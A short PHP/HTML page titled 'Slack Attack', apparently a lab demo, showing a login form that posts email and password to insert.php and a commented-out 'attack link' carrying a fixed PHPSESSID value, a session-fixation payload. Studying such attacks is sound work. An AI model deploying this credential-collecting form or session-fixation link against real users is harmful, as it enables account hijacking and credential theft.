<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Slack Attack</title>
    <link rel="stylesheet" href="attack.css">
</head>

<?php
  session_start();
?>


<body class="full_height get_started">
    <div class="login">
        <div class="login-triangle"></div>
        
        <h2 class="login-header">Log in</h2>
      
        <form class="login-container" action="insert.php" method="post">
          <p><input type="email" placeholder="Email/ID" name="lid"></p>
          <p><input type="password" placeholder="Password" name="lpw"></p>
          <p><input type="submit" value="Log in"></p>
          <!-- <a href="https://www.facebook.com/?PHPSESSID=abcd">攻撃用のリンク</a> -->
        </form>
      </div>
</body>
</html>